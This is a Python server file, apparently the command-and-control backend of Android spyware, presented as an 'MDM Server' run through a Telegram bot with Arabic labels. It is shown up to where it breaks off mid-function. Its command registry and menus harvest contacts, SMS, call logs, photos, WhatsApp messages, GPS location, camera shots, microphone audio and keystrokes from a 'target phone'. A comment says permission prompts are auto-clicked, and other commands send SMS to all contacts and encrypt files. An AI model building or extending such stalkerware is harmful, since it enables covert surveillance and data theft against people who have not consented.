"""
MDM Server v7.0 - Beautiful Redesigned Bot UI
Flask + Socket.IO + REST API + Telegram Bot
NO DATABASE - In-memory dict only
Short device IDs (#1, #2, #3...)
Auto bot alert when device connects
HTML-formatted bot messages - BEAUTIFUL & ORGANIZED
"""
import eventlet
eventlet.monkey_patch()

import hashlib
import hmac
import logging
import os
import sys
import time
import threading
import uuid
from datetime import datetime, timedelta, timezone

from flask import Flask, jsonify, make_response, request
from flask_socketio import SocketIO, emit, disconnect
import telebot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
from dotenv import load_dotenv

load_dotenv()

# ═══════════════════════════════════════════════════════════════════════
# 1. CONFIG
# ═══════════════════════════════════════════════════════════════════════

class Config:
    BOT_TOKEN: str = os.getenv("BOT_TOKEN", "")
    ADMIN_IDS: list[int] = [int(u.strip()) for u in os.getenv("ADMIN_IDS", "").split(",") if u.strip().isdigit()]
    PORT: int = int(os.getenv("MDM_PORT", os.getenv("PORT", 5000)))
    SECRET_KEY: str = os.getenv("MDM_SECRET_KEY", "")
    E2E_KEY: str = os.getenv("E2E_KEY", "")
    LIVE_ACCESS_KEY: str = os.getenv("LIVE_ACCESS_KEY", "")
    SERVER_URL: str = os.getenv("SELF_PING_URL", os.getenv("SERVER_URL", "https://b-lpf3.onrender.com"))
    HEARTBEAT_TIMEOUT: int = 30  # ✅ Reduced to 30s: if no heartbeat in 30s, device is disconnected

    @classmethod
    def validate(cls) -> list[str]:
        errors = []
        if not cls.BOT_TOKEN or cls.BOT_TOKEN == "your_bot_token_here":
            errors.append("BOT_TOKEN")
        if not cls.ADMIN_IDS:
            errors.append("ADMIN_IDS")
        return errors


# ═══════════════════════════════════════════════════════════════════════
# 2. IN-MEMORY DEVICE STORE (NO DATABASE)
# ═══════════════════════════════════════════════════════════════════════

class DeviceStore:
    """Simple in-memory device storage with short IDs"""

    def __init__(self):
        self._devices: dict[str, dict] = {}      # device_id -> {short_id, model, version, ip, status, ...}
        self._sid_map: dict[str, str] = {}        # sid -> device_id
        self._next_id: int = 1
        self._lock = threading.Lock()

    def register_or_update(self, device_id, sid, model=None, version=None, ip=None, extra_info=None):
        with self._lock:
            is_new = device_id not in self._devices

            if is_new:
                short_id = self._next_id
                self._next_id += 1
                self._devices[device_id] = {
                    "short_id": short_id,
                    "device_id": device_id,
                    "sid": sid,
                    "model": model or "Unknown",
                    "version": version or "?",
                    "ip": ip or "",
                    "status": "online",
                    "banned": False,
                    "ban_reason": None,
                    "last_seen": datetime.now(timezone.utc),
                    "created_at": datetime.now(timezone.utc),
                    "extra_info": extra_info,
                }
            else:
                dev = self._devices[device_id]
                if dev["banned"]:
                    return dev, False, "الجهاز محظور"
                old_sid = dev.get("sid")
                if old_sid and old_sid in self._sid_map:
                    del self._sid_map[old_sid]
                dev["sid"] = sid
                if model: dev["model"] = model
                if version: dev["version"] = version
                if ip: dev["ip"] = ip
                if extra_info: dev["extra_info"] = extra_info
                dev["status"] = "online"
                dev["last_seen"] = datetime.now(timezone.utc)

            self._sid_map[sid] = device_id
            dev = self._devices[device_id]
            msg = "تم تسجيل الجهاز" if is_new else "تم تحديث الجهاز"
            return dev, is_new, msg

    def handle_disconnect(self, sid):
        with self._lock:
            did = self._sid_map.pop(sid, None)
            if not did: return
            dev = self._devices.get(did)
            if dev and dev.get("sid") == sid:
                dev["status"] = "offline"
                dev["sid"] = None
                dev["last_seen"] = datetime.now(timezone.utc)

    def handle_heartbeat(self, sid):
        with self._lock:
            did = self._sid_map.get(sid)
            if not did: return None
            dev = self._devices.get(did)
            if dev and not dev["banned"]:
                dev["last_seen"] = datetime.now(timezone.utc)
                dev["status"] = "online"
            return dev

    def ban_device(self, device_id, reason=None):
        with self._lock:
            dev = self._devices.get(device_id)
            if not dev: return False, "غير موجود"
            dev["banned"] = True
            dev["ban_reason"] = reason
            dev["status"] = "banned"
            return True, f"تم حظر #{dev['short_id']}"

    def unban_device(self, device_id):
        with self._lock:
            dev = self._devices.get(device_id)
            if not dev: return False, "غير موجود"
            dev["banned"] = False
            dev["ban_reason"] = None
            dev["status"] = "offline"
            return True, f"تم إلغاء حظر #{dev['short_id']}"

    def delete_device(self, device_id):
        with self._lock:
            dev = self._devices.pop(device_id, None)
            if not dev: return False, "غير موجود"
            for sid, did in list(self._sid_map.items()):
                if did == device_id:
                    del self._sid_map[sid]
            return True, f"تم حذف #{dev['short_id']}"

    def get_device(self, device_id):
        return self._devices.get(device_id)

    def get_all_devices(self):
        return sorted(self._devices.values(), key=lambda d: d.get("created_at", datetime.min.replace(tzinfo=timezone.utc)), reverse=True)

    def get_online_devices(self):
        return [d for d in self._devices.values() if d["status"] == "online"]

    def get_banned_devices(self):
        return [d for d in self._devices.values() if d["banned"]]

    def get_device_by_sid(self, sid):
        did = self._sid_map.get(sid)
        return self._devices.get(did) if did else None

    def get_sid_for_device(self, device_id):
        for sid, did in self._sid_map.items():
            if did == device_id:
                return sid
        return None

    def get_stats(self):
        return {
            "total": len(self._devices),
            "online": sum(1 for d in self._devices.values() if d["status"] == "online"),
            "offline": sum(1 for d in self._devices.values() if d["status"] == "offline"),
            "banned": sum(1 for d in self._devices.values() if d["banned"]),
        }

    def cleanup_stale(self, timeout_seconds=300):
        threshold = datetime.now(timezone.utc) - timedelta(seconds=timeout_seconds)
        count = 0
        with self._lock:
            for dev in self._devices.values():
                if dev["status"] == "online" and dev.get("last_seen", datetime.min.replace(tzinfo=timezone.utc)) < threshold:
                    dev["status"] = "offline"
                    dev["sid"] = None
                    count += 1
        return count


# ═══════════════════════════════════════════════════════════════════════
# 3. COMMAND REGISTRY
# ═══════════════════════════════════════════════════════════════════════

CATEGORIES = {
    "data":           {"label": "📦 سحب بيانات",       "emoji": "📦"},
    "camera":         {"label": "📷 كاميرا وشاشة",    "emoji": "📷"},
    "audio":          {"label": "🎤 صوت",              "emoji": "🎤"},
    "control":        {"label": "🎮 أدوات تحكم",       "emoji": "🎮"},
    "advanced":       {"label": "⚡ أوامر متقدمة",     "emoji": "⚡"},
    "info":           {"label": "ℹ️ معلومات",          "emoji": "ℹ️"},
    # ⚠️ app_monitoring تمت إزالته
    "permissions": {"label": "🔓 الأذونات", "emoji": "🔓"},
}

COMMANDS = {
    # data
    "contacts":       {"category": "data",   "label": "👥 جهات الاتصال", "description": "سحب جهات الاتصال",          "needs_param": False},
    "all-sms":        {"category": "data",   "label": "💬 الرسائل",          "description": "سحب الرسائل النصية",       "needs_param": False},
    "calls":          {"category": "data",   "label": "📞 سجل المكالمات",    "description": "سحب سجل المكالمات",       "needs_param": False},
    "apps":           {"category": "data",   "label": "📱 التطبيقات",        "description": "سحب التطبيقات المثبتة",    "needs_param": False},
    "gallery":        {"category": "data",   "label": "🖼 المعرض",            "description": "سحب صور المعرض",          "needs_param": False},
    # ⚠️ gmail تمت إزالته — يحتاج Notification Access
    # ⚠️ whatsapp-messages تمت إزالته — يحتاج Notification Access
    "whatsapp-live":     {"category": "data", "label": "💬 واتساب مباشر",  "description": "قراءة واتساب من الشاشة (بدون إذن إشعارات)", "needs_param": False},
    "whatsapp-monitor-on":  {"category": "data", "label": "👁️ تفعيل مراقبة واتساب", "description": "مراقبة دائمة لرسائل واتساب", "needs_param": False},
    "whatsapp-monitor-off": {"category": "data", "label": "⏹ إيقاف مراقبة واتساب", "description": "إيقاف مراقبة واتساب", "needs_param": False},
    # ⚠️ telegram-messages تمت إزالته — يحتاج Notification Access
    "get-location":   {"category": "data",   "label": "📍 الموقع GPS",     "description": "تتبع موقع الجهاز",       "needs_param": False},
    # camera
    "main-camera":    {"category": "camera", "label": "📷 كاميرا رئيسية",    "description": "تصوير بالكاميرا الخلفية",  "needs_param": False},
    "selfie-camera":  {"category": "camera", "label": "🤳 كاميرا سيلفي",     "description": "تصوير بالكاميرا الأمامية", "needs_param": False},
    # screenshot تمت إزالته من المشروع
    # audio
    "microphone":     {"category": "audio",  "label": "🎤 تسجيل صوتي",      "description": "تسجيل من الميكروفون (اكتب المدة بالثواني)",     "needs_param": True, "param_hint": "10 أو 60 أو 120 (ثانية)"},
    "playAudio":      {"category": "audio",  "label": "🔊 تشغيل صوت",       "description": "تشغيل ملف صوتي",          "needs_param": True, "param_hint": "رابط الصوت"},
    "stopAudio":      {"category": "audio",  "label": "🔇 إيقاف الصوت",      "description": "إيقاف الصوت",              "needs_param": False},
    # control
    "toast":              {"category": "control", "label": "💬 رسالة Toast",      "description": "رسالة منبثقة",          "needs_param": True, "param_hint": "نص الرسالة"},
    "vibrate":            {"category": "control", "label": "📳 اهتزاز",            "description": "تشغيل الاهتزاز",          "needs_param": False},
    "sendSms":            {"category": "control", "label": "📤 إرسال SMS",       "description": "إرسال رسالة نصية",       "needs_param": True, "param_hint": "رقم:نص الرسالة"},
    "makeCall":           {"category": "control", "label": "📞 إجراء مكالمة",     "description": "مكالمة هاتفية",           "needs_param": True, "param_hint": "رقم الهاتف"},
    "device-policy-lock": {"category": "control", "label": "🔒 قفل الجهاز",       "description": "قفل شاشة الجهاز",       "needs_param": False},
    "popNotification":    {"category": "control", "label": "🔔 إشعار",            "description": "إظهار إشعار",             "needs_param": True, "param_hint": "عنوان:نص"},
    "smsToAllContacts":   {"category": "control", "label": "📨 SMS للجميع",      "description": "SMS لكل جهات الاتصال",   "needs_param": True, "param_hint": "نص الرسالة"},
    # advanced
    "input-monitoring-on":  {"category": "advanced", "label": "⌨️ مراقبة الإدخال", "description": "مراقبة لوحة المفاتيح",    "needs_param": False},
    "input-monitoring-off": {"category": "advanced", "label": "⏹ إيقاف المراقبة", "description": "إيقاف المراقبة",           "needs_param": False},
    # screenshot-on/off تمت إزالته من المشروع
    "apply-data-protection": {"category": "advanced", "label": "🔐 حماية البيانات",      "description": "تشفير الملفات محلياً",   "needs_param": False},
    "pull-videos":           {"category": "advanced", "label": "🎬 سحب فيديوهات",       "description": "سحب الفيديوهات",          "needs_param": False},
    "stop-videos":           {"category": "advanced", "label": "⏹ إيقاف الفيديو",    "description": "إيقاف سحب الفيديو",      "needs_param": False},
    "stop-gallery":          {"category": "advanced", "label": "⏹ إيقاف المعرض",    "description": "إيقاف سحب المعرض",      "needs_param": False},
    # info
    "get-device-info": {"category": "info", "label": "📋 معلومات الجهاز",  "description": "معلومات تفصيلية",     "needs_param": False},
    "ls":              {"category": "info", "label": "📂 مستعرض الملفات",  "description": "تصفح ملفات الجهاز",  "needs_param": False},
    "media-images":    {"category": "info", "label": "📷 الصور",          "description": "عرض كل الصور",       "needs_param": False},
    "media-videos":    {"category": "info", "label": "🎥 الفيديوهات",     "description": "عرض كل الفيديوهات",  "needs_param": False},
    "media-audio":     {"category": "info", "label": "🎵 الصوتيات",       "description": "عرض كل الملفات الصوتية", "needs_param": False},
    "download-media":  {"category": "info", "label": "📥 تحميل وسائط",     "description": "تحميل ملف وسائط",    "needs_param": True, "param_hint": "content://..."},
    "download-file":   {"category": "info", "label": "📥 تحميل ملف",      "description": "تحميل ملف من الجهاز", "needs_param": True, "param_hint": "/sdcard/file.txt"},
    # ⚠️ app_monitoring تمت إزالته
}

def get_commands_by_category(cat):
    return [c for c, i in COMMANDS.items() if i["category"] == cat]

def build_command_payload(cmd_type, params=None):
    cmd = COMMANDS.get(cmd_type)
    # ✅ request-permission is not in COMMANDS dict but should be sent directly
    if not cmd:
        if cmd_type == "request-permission":
            p = {"command": cmd_type, "category": "permissions",
                 "timestamp": datetime.now(timezone.utc).isoformat()}
            if params:
                if isinstance(params, dict):
                    p["params"] = params
                else:
                    p["params"] = {"value": str(params)}
            return p
        return None
    p = {"command": cmd_type, "category": cmd["category"],
         "timestamp": datetime.now(timezone.utc).isoformat()}
    if params and cmd["needs_param"]:
        if isinstance(params, dict):
            p["params"] = params
        else:
            p["params"] = {"value": str(params)}
    return p


# ═══════════════════════════════════════════════════════════════════════
# 4. TELEGRAM KEYBOARDS - BEAUTIFUL & ORGANIZED
# ═══════════════════════════════════════════════════════════════════════

def _cb(device_id, action, target):
    """Build callback_data. Telegram limits this to 64 bytes.
    
    Strategy:
    - For file explorer actions: cache the path, use short key (saves ~50 bytes)
    - For other actions: keep full device_id (needed for get_device lookup)
    - Always truncate to 64 bytes as final safety net
    """
    if action in ("filexplore", "filedl") and target and len(target) > 10:
        # Cache the path and use a short numeric key
        cache_key = str(len(_file_path_cache))
        _file_path_cache[cache_key] = target
        # Keep cache small - remove old entries
        if len(_file_path_cache) > 500:
            keys = list(_file_path_cache.keys())
            for k in keys[:250]:
                del _file_path_cache[k]
        # Format: filexplore:DEVICE_ID:CACHE_KEY (cache_key is short like "0", "1", etc.)
        result = f"{action}:{device_id}:{cache_key}"
        # If still too long, truncate device_id from the right
        if len(result) > 64:
            # Keep action: + cache_key, truncate device_id
            overhead = len(action) + 1 + len(cache_key) + 1  # action + : + : + cache_key
            max_did_len = 64 - overhead
            if max_did_len > 8:
                result = f"{action}:{device_id[:max_did_len]}:{cache_key}"
            else:
                # Fallback: use short hash of device_id
                result = f"{action}:{hash(device_id) % 99999}:{cache_key}"
        return result[:64]
    # ⚡ FIX: For permission requests, use a short cache key to avoid truncation
    # Telegram limits callback_data to 64 bytes. Long device IDs + "request-permission:camera"
    # can exceed this, causing truncation like "cam" instead of "camera".
    if action == "cmd" and target and target.startswith("request-permission:"):
        perm_type = target.split(":", 1)[1]  # e.g. "camera"
        cache_key = str(len(_file_path_cache))
        _file_path_cache[cache_key] = target  # cache the full "request-permission:camera"
        # Format: cmd:DEVICE_ID:pCACHE_KEY (very short)
        result = f"{action}:{device_id}:p{cache_key}"
        if len(result) > 64:
            # Truncate device_id if still too long
            overhead = len(action) + 1 + 1 + len(cache_key) + 1  # action + : + p + key + :
            max_did_len = 64 - overhead
            if max_did_len > 8:
                result = f"{action}:{device_id[:max_did_len]}:p{cache_key}"
            else:
                result = f"{action}:{hash(device_id) % 99999}:p{cache_key}"
        return result[:64]
    # For non-file actions, use full format but truncate if needed
    return f"{action}:{device_id}:{target}"[:64]

# Cache for file paths (key → full path)
_file_path_cache: dict[str, str] = {}

def _resolve_file_path(callback_target):
    """Resolve a callback target back to the full file path if it's a cache key."""
    if callback_target and callback_target.isdigit():
        return _file_path_cache.get(callback_target, callback_target)
    # ⚡ Permission cache keys start with 'p' (e.g. "p0", "p1")
    if callback_target and callback_target.startswith("p") and callback_target[1:].isdigit():
        return _file_path_cache.get(callback_target[1:], callback_target)
    return callback_target

def _cbtn(device_id, cmd_type):
    i = COMMANDS[cmd_type]
    a = "param" if i["needs_param"] else "cmd"
    return InlineKeyboardButton(i["label"], callback_data=_cb(device_id, a, cmd_type))

def _back(device_id):
    return InlineKeyboardButton("🔙 رجوع", callback_data=_cb(device_id, "kb", "control_panel"))

def _home_btn():
    return InlineKeyboardButton("🏠 الرئيسية", callback_data="menu:home")

# ── Main Control Panel ──
def control_panel_keyboard(did, banned=False):
    kb = InlineKeyboardMarkup(row_width=2)
    # Section 1: Data Collection
    kb.add(
        InlineKeyboardButton("📦 سحب بيانات", callback_data=_cb(did,"kb","data")),
        InlineKeyboardButton("📷 كاميرا وشاشة", callback_data=_cb(did,"kb","camera"))
    )
    # Section 2: Audio & Control
    kb.add(
        InlineKeyboardButton("🎤 صوت", callback_data=_cb(did,"kb","audio")),
        InlineKeyboardButton("🎮 أدوات تحكم", callback_data=_cb(did,"kb","tools"))
    )
    # Section 3: Advanced & Info
    kb.add(
        InlineKeyboardButton("⚡ أوامر متقدمة", callback_data=_cb(did,"kb","advanced")),
        InlineKeyboardButton("ℹ️ معلومات", callback_data=_cb(did,"kb","info"))
    )
    # Section 4: App Monitoring & Permissions (full width)
    # ⚠️ مراقبة التطبيقات تمت إزالته من اللوحة
    kb.add(InlineKeyboardButton("🔓 الأذونات", callback_data=_cb(did,"kb","permissions")))
    # Section 5: Device Management (separate section)
    kb.add(
        InlineKeyboardButton("📋 تفاصيل الجهاز", callback_data=_cb(did,"info_act","")),
    )
    if banned:
        kb.add(
            InlineKeyboardButton("✅ إلغاء الحظر", callback_data=_cb(did,"unban","")),
        )
    else:
        kb.add(
            InlineKeyboardButton("⛔ حظر", callback_data=_cb(did,"ban","")),
        )
    kb.add(
        InlineKeyboardButton("🔌 طرد", callback_data=_cb(did,"kick","")),
        InlineKeyboardButton("🗑 حذف", callback_data=_cb(did,"delete",""))
    )
    return kb

# ── Data Commands Keyboard ──
def data_keyboard(did):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(_cbtn(did,"contacts"), _cbtn(did,"all-sms"))
    kb.add(_cbtn(did,"calls"), _cbtn(did,"apps"))
    kb.add(_cbtn(did,"gallery"))
    # ⚠️ gmail تمت إزالته
    kb.add(_cbtn(did,"whatsapp-live"))
    kb.add(_cbtn(did,"whatsapp-monitor-on"))
    kb.add(_cbtn(did,"whatsapp-monitor-off"))
    # ⚠️ telegram-messages تمت إزالته
    kb.add(_cbtn(did,"get-location"))
    kb.add(_back(did))
    return kb

# ── Camera & Screen Keyboard ──
def camera_keyboard(did):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(_cbtn(did,"main-camera"), _cbtn(did,"selfie-camera"))
    # screenshot تمت إزالته
    kb.add(_back(did))
    return kb

# ── Audio Keyboard ──
def audio_keyboard(did):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(_cbtn(did,"microphone"), _cbtn(did,"playAudio"))
    kb.add(_cbtn(did,"stopAudio"))
    kb.add(_back(did))
    return kb

# ── Control Tools Keyboard ──
def tools_keyboard(did):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(_cbtn(did,"toast"), _cbtn(did,"vibrate"))
    kb.add(_cbtn(did,"sendSms"), _cbtn(did,"makeCall"))
    kb.add(_cbtn(did,"device-policy-lock"), _cbtn(did,"popNotification"))
    kb.add(_cbtn(did,"smsToAllContacts"))
    kb.add(_back(did))
    return kb

# ── Advanced Keyboard ──
def advanced_keyboard(did):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(_cbtn(did,"input-monitoring-on"), _cbtn(did,"input-monitoring-off"))
    # screenshot-on/off تمت إزالته
    kb.add(_cbtn(did,"apply-data-protection"))
    kb.add(_cbtn(did,"pull-videos"), _cbtn(did,"stop-videos"))
    kb.add(_cbtn(did,"stop-gallery"))
    kb.add(_back(did))
    return kb

# ── Permissions Keyboard ──
def permissions_keyboard(did):
    kb = InlineKeyboardMarkup(row_width=2)
    # ⚡ كل زر يطلب إذناً واحداً فقط — لا أزرار "all"
    # كل إذن يُفعّل بشكل مستقل تماماً
    # PermissionAutoGrantEngine ينقر تلقائياً على "السماح" عبر 3 استراتيجيات
    perm_btn = lambda perm, label: InlineKeyboardButton(
        f"🔓 {label}",
        callback_data=_cb(did, "cmd", f"request-permission:{perm}")
    )
    kb.add(perm_btn("camera", "📷 الكاميرا"),
           perm_btn("microphone", "🎤 الميكروفون"))
    kb.add(perm_btn("location", "📍 الموقع"),
           perm_btn("background-location", "🌐 الموقع في الخلفية"))
    kb.add(perm_btn("storage", "📁 التخزين"),
           perm_btn("contacts", "👥 جهات الاتصال"))
    kb.add(perm_btn("sms", "💬 الرسائل"),
           perm_btn("calls", "📞 المكالمات"))
    kb.add(perm_btn("notifications", "🔔 الإشعارات"),
           perm_btn("phone-state", "📱 حالة الهاتف"))
    kb.add(_back(did))
    return kb

# ── Info Keyboard ──
def info_keyboard(did):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(_cbtn(did,"get-device-info"))
    # ✅ Media explorer buttons (use MediaStore - "الملفات والوسائط" permission)
    kb.add(_cbtn(did,"media-images"), _cbtn(did,"media-videos"))
    kb.add(_cbtn(did,"media-audio"))
    kb.add(_back(did))
    return kb

# ── App Monitoring Keyboard ──
# ⚠️ app_monitoring_keyboard تمت إزالته

_KB = {"control_panel": control_panel_keyboard, "data": data_keyboard, "camera": camera_keyboard,
       "audio": audio_keyboard, "tools": tools_keyboard, "advanced": advanced_keyboard,
       "info": info_keyboard,
       "permissions": permissions_keyboard}

_KB_TITLE = {"control_panel": "⚙ لوحة التحكم", "data": "📦 سحب بيانات", "camera": "📷 كاميرا وشاشة",
             "audio": "🎤 صوت", "tools": "🎮 أدوات تحكم", "advanced": "⚡ أوامر متقدمة",
             "info": "ℹ️ معلومات",
             "permissions": "🔓 الأذونات"}


# ═══════════════════════════════════════════════════════════════════════
# 5. HELPER: Device display label with short ID
# ═══════════════════════════════════════════════════════════════════════

def _dev_label(dev):
    """Short label: #1 Samsung Galaxy S22"""
    sid = dev.get("short_id", "?")
    model = dev.get("model", "?")
    return f"#{sid} {model}"

def _dev_status_emoji(dev):
    return {"online": "🟢", "offline": "🔴", "banned": "⛔"}.get(dev.get("status", ""), "⚪")

def _time_ago(dt):
    """Human readable time ago"""
    if not dt: return "?"
    now = datetime.now(timezone.utc)
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    diff = now - dt
    seconds = int(diff.total_seconds())
    if seconds < 60: return "الآن"
    elif seconds < 3600: return f"منذ {seconds // 60} دقيقة"
    elif seconds < 86400: return f"منذ {seconds // 3600} ساعة"
    else: return f"منذ {seconds // 86400} يوم"


# ═══════════════════════════════════════════════════════════════════════
# 6. BEAUTIFUL MESSAGE FORMATTING
# ═══════════════════════════════════════════════════════════════════════

def _format_dashboard(stats, devices):
    """Beautiful main dashboard HTML"""
    lines = [
        "<b>🛡 نظام إدارة الأجهزة</b>",
        "",
        f"┌ <b>📊 الملخص</b>",
        f"├ 🟢 متصل: <b>{stats['online']}</b>",
        f"├ 🔴 غير متصل: <b>{stats['offline']}</b>",
        f"├ ⛔ محظور: <b>{stats['banned']}</b>",
        f"└ 📱 الإجمالي: <b>{stats['total']}</b>",
        "",
    ]

    if not devices:
        lines.append("❌ <b>لا توجد أجهزة مسجلة</b>")
        lines.append("")
        lines.append("ثبّت التطبيق على الهاتف المستهدف")
        lines.append("وفعّل جميع الأذونات المطلوبة.")
        return "\n".join(lines)

    # Online devices first
    online = [d for d in devices if d["status"] == "online"]
    offline = [d for d in devices if d["status"] == "offline"]
    banned = [d for d in devices if d["banned"]]

    if online:
        lines.append("┌ <b>🟢 الأجهزة المتصلة</b>")
        for d in online:
            ago = _time_ago(d.get("last_seen"))
            lines.append(f"├ <b>#{d['short_id']}</b> {d.get('model', '?')} — {ago}")
        lines.append("│")

    if offline:
        lines.append("┌ <b>🔴 غير متصلة</b>")
        for d in offline[:5]:  # Show max 5 offline
            ago = _time_ago(d.get("last_seen"))
            lines.append(f"├ <b>#{d['short_id']}</b> {d.get('model', '?')} — {ago}")
        if len(offline) > 5:
            lines.append(f"└ ... و {len(offline) - 5} أخرى")
        lines.append("│")

    if banned:
        lines.append("┌ <b>⛔ محظورة</b>")
        for d in banned:
            lines.append(f"├ <b>#{d['short_id']}</b> {d.get('model', '?')}")
        lines.append("│")

    lines.append("")
    lines.append("👇 اختر جهازاً للتحكم به")

    return "\n".join(lines)


def _format_device_card(dev):
    """Beautiful device info card"""
    se = _dev_status_emoji(dev)
    status_text = {"online": "متصل الآن", "offline": "غير متصل", "banned": "محظور"}.get(dev.get("status", ""), dev.get("status", "?"))
    ago = _time_ago(dev.get("last_seen"))

    lines = [
        f"<b>{se} #{dev['short_id']} {dev.get('model', '?')}</b>",
        "",
        f"┌ <b>📋 التفاصيل</b>",
        f"├ 📱 النموذج: {dev.get('model', '?')}",
        f"├ 📲 الإصدار: Android {dev.get('version', '?')}",
        f"├ 🌐 IP: <code>{dev.get('ip', '?')}</code>",
        f"├ 📡 الحالة: {status_text}",
        f"├ 👁 آخر ظهور: {ago}",
        f"├ ⛔ محظور: {'نعم' if dev.get('banned') else 'لا'}",
        f"└ 📅 التسجيل: {dev.get('created_at', datetime.min.replace(tzinfo=timezone.utc)).strftime('%Y-%m-%d %H:%M') if dev.get('created_at') else '-'}",
        "",
        "👇 اختر الأمر من الأزرار أدناه",
    ]
    return "\n".join(lines)


def _format_category_header(cat_key, dev):
    """Beautiful category page header"""
    label = _KB_TITLE.get(cat_key, cat_key)
    model = dev.get("model", "?") if dev else "?"
    sid = dev.get("short_id", "?") if dev else "?"
    se = _dev_status_emoji(dev) if dev else "⚪"

    return (
        f"<b>{label}</b>\n\n"
        f"{se} <b>#{sid} {model}</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"اختر الأمر:"
    )


def _format_cmd_sent(dev, command, params=None):
    """Beautiful command sent confirmation"""
    short_label = _dev_label(dev)
    lbl = COMMANDS.get(command, {}).get("label", command)
    desc = COMMANDS.get(command, {}).get("description", "")

    lines = [
        f"<b>⚡ تم إرسال الأمر فوراً</b>",
        "",
        f"┌ <b>📋 تفاصيل الأمر</b>",
        f"├ 📱 الجهاز: <b>{short_label}</b>",
        f"├ ⚙ الأمر: {lbl}",
        f"├ 📝 الوصف: {desc}",
    ]
    if params:
        lines.append(f"├ 📋 المعامل: <code>{params}</code>")
    lines.append("└ ⏳ جاري الانتظار...")
    lines.append("")
    lines.append("ستصلك النتيجة تلقائياً")

    return "\n".join(lines)


def _format_file_list_result(dev, file_data):
    """Format file list as inline keyboard buttons."""
    did = dev.get("device_id", "")
    short_label = _dev_label(dev)
    path = file_data.get("path", "/sdcard/")
    parent = file_data.get("parent", "")
    files = file_data.get("files", [])
    error = file_data.get("error", "")
    
    kb = InlineKeyboardMarkup(row_width=1)
    
    if error:
        text = (
            f"❌ <b>خطأ في تصفح الملفات</b>\n\n"
            f"📁 المسار: <code>{path}</code>\n"
            f"⚠ الخطأ: {error}\n\n"
            f"💡 قد تحتاج إذن التخزين"
        )
        kb.add(_back(did))
        return text, kb
    
    # Add parent directory button
    if parent and parent != path:
        kb.add(InlineKeyboardButton(
            "📁 .. (السابق)",
            callback_data=_cb(did, "filexplore", parent)
        ))
    
    # Add file/folder buttons
    dir_count = 0
    file_count = 0
    for f in files:
        name = f.get("name", "?")
        fpath = f.get("path", "")
        is_dir = f.get("is_dir", False)
        size = f.get("size", 0)
        
        if is_dir:
            kb.add(InlineKeyboardButton(
                f"📁 {name}/",
                callback_data=_cb(did, "filexplore", fpath)
            ))
            dir_count += 1
        else:
            size_str = ""
            if size > 1024 * 1024:
                size_str = f" ({size // (1024*1024)}MB)"
            elif size > 1024:
                size_str = f" ({size // 1024}KB)"
            
            kb.add(InlineKeyboardButton(
                f"📄 {name}{size_str}",
                callback_data=_cb(did, "filedl", fpath)
            ))
            file_count += 1
    
    # Add back button
    kb.add(_back(did))
    
    if dir_count == 0 and file_count == 0:
        text = (
            f"📂 <b>مستعرض الملفات</b>\n\n"
            f"📱 <b>{short_label}</b>\n"
            f"📁 <b>المسار:</b> <code>{path}</code>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📁 المجلد فارغ"
        )
    else:
        text = (
            f"📂 <b>مستعرض الملفات</b>\n\n"
            f"📱 <b>{short_label}</b>\n"
            f"📁 <b>المسار:</b> <code>{path}</code>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📁 مجلدات: {dir_count} | 📄 ملفات: {file_count}\n\n"
            f"💡 اضغط على مجلد للدخول\n"
            f"💡 اضغط على ملف لتحميله"
        )
    
    return text, kb


def _format_media_list_result(dev, media_data):
    """Format media file list (images/videos/audio) as inline keyboard buttons.

    Uses _file_path_cache to keep callback_data under Telegram's 64-byte limit.
    Buttons call 'mediadl' action with cached URI key.
    """
    did = dev.get("device_id", "")
    short_label = _dev_label(dev)
    media_type = media_data.get("media_type", "media")
    files = media_data.get("files", [])
    error = media_data.get("error", "")
    count = media_data.get("count", 0)

    # Header labels
    type_labels = {
        "images": "📷 الصور",
        "videos": "🎥 الفيديوهات",
        "audio": "🎵 الصوتيات"
    }
    type_label = type_labels.get(media_type, "📂 الوسائط")

    kb = InlineKeyboardMarkup(row_width=1)

    if error:
        text = (
            f"❌ <b>خطأ في جلب الوسائط</b>\n\n"
            f"📱 <b>{short_label}</b>\n"
            f"⚙ {type_label}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"⚠ الخطأ: {error}\n\n"
            f"💡 قد تحتاج منح صلاحية 'الملفات والوسائط'"
        )
        kb.add(_back(did))
        return text, kb

    if not files:
        text = (
            f"📂 <b>{type_label}</b>\n\n"
            f"📱 <b>{short_label}</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📁 لا توجد ملفات"
        )
        kb.add(_back(did))
        return text, kb

    # Add file buttons
    file_count = 0
    for f in files:
        name = f.get("name", "?")
        uri = f.get("uri", "")
        size = f.get("size", 0)

        size_str = ""
        if size > 1024 * 1024:
            size_str = f" ({size // (1024 * 1024)}MB)"
        elif size > 1024:
            size_str = f" ({size // 1024}KB)"

        # Use media_type-specific icon
        icon = "📷" if media_type == "images" else ("🎥" if media_type == "videos" else "🎵")

        # Cache the URI to keep callback_data short
        cache_key = str(len(_file_path_cache))
        _file_path_cache[cache_key] = uri
        # Keep cache small
        if len(_file_path_cache) > 500:
            keys = list(_file_path_cache.keys())
            for k in keys[:250]:
                del _file_path_cache[k]

        kb.add(InlineKeyboardButton(
            f"{icon} {name}{size_str}",
            callback_data=_cb(did, "mediadl", cache_key)
        ))
        file_count += 1

    kb.add(_back(did))

    text = (
        f"📂 <b>{type_label}</b>\n\n"
        f"📱 <b>{short_label}</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📊 عدد الملفات: {file_count}\n\n"
        f"💡 اضغط على أي ملف لتحميله"
    )

    return text, kb


def _format_cmd_result(dev, command, status, data=None, error=None, full_response=None):
    """Beautiful command result.
    
    full_response: the complete response dict (used to extract permissions_needed
                   for permission_required status, since the app sends it in a
                   separate field, not in 'data').
    """
    short_label = _dev_label(dev)
    lbl = COMMANDS.get(command, {}).get("label", command)
    did = dev.get("device_id", "")

    if status == "success" and data:
        text_resp = str(data) if not isinstance(data, str) else data

